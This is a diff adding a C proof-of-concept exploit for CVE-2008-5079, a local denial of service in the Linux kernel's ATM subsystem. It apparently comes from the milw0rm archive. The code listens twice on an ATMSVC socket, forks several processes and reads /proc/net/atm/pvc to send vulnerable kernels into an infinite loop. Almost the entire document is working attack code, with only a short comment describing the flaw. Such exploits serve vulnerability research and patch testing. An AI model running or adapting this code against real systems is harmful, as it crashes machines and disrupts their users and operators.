@@ -1,0 +1,98 @@
+/*
+ * cve-2008-5079.c
+ *
+ * Linux Kernel <= 2.6.27.8 ATMSVC local DoS
+ * Jon Oberheide <jon@oberheide.org>
+ *
+ * http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5079:
+ *
+ *   net/atm/svc.c in the ATM subsystem in the Linux kernel 2.6.27.8
+ *   and earlier allows local users to cause a denial of service  
+ *   (kernel infinite loop) by making two calls to svc_listen for the
+ *   same socket, and then reading a /proc/net/atm/*vc file, related  
+ *   to corruption of the vcc table.  
+ *
+ */
+ 
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <linux/atm.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+ 
+#define NR_CPUS 8
+#define PROC_ATM "/proc/net/atm/pvc"
+ 
+int
+main(void)
+{
+    char *err, dummy[1024];
+    int i, ret, sock, proc;
+    struct atm_qos qos;
+    struct sockaddr_atmsvc addr;
+ 
+    printf("[+] creating ATM socket...\n");
+ 
+    sock = socket(PF_ATMSVC, SOCK_DGRAM, 0);
+    if (sock < 0) {
+        err = "socket(2) for type PF_ATMSVC failed";
+        printf("[-] PoC error: %s (%s)\n", err, strerror(errno));
+        return 1;
+    }
+ 
+    memset(&qos, 0, sizeof(qos));
+    qos.rxtp.traffic_class = ATM_UBR;
+    qos.txtp.traffic_class = ATM_UBR;
+    qos.aal = ATM_NO_AAL;
+ 
+    printf("[+] setting socket QoS options...\n");
+ 
+    ret = setsockopt(sock, SOL_ATM, SO_ATMQOS, &qos, sizeof(qos));
+    if (ret == -1) {
+        err = "setsockopt(2) for option SO_ATMQOS failed";
+        printf("[-] PoC error: %s (%s)\n", err, strerror(errno));
+        return 1;
+    }
+ 
+    memset(&addr, 0, sizeof(addr));
+    addr.sas_family = AF_ATMSVC;
+ 
+    printf("[+] binding socket...\n");
+ 
+    bind(sock, (struct sockaddr *) &addr, sizeof(addr));
+ 
+    printf("[+] socket listen...\n");
+ 
+    listen(sock, 10);
+ 
+    printf("[+] duplicate socket listen...\n");
+ 
+    listen(sock, 10);
+ 
+    printf("[+] attempting local DoS...\n");
+ 
+    for (i = 0; i < NR_CPUS; ++i) {
+        if (fork() != 0) {
+            break;
+        }
+    }
+ 
+    proc = open(PROC_ATM, O_RDONLY);
+    if (proc == -1) {
+        err = "opening " PROC_ATM " failed";
+        printf("[-] PoC error: %s (%s)\n", err, strerror(errno));
+        return 1;
+    }
+    ret = read(proc, &dummy, 1024);
+    close(proc);
+    
+    printf("[-] Local DoS failed.\n");
+ 
+    return 0;
+}
+
+// milw0rm.com [2008-12-10]
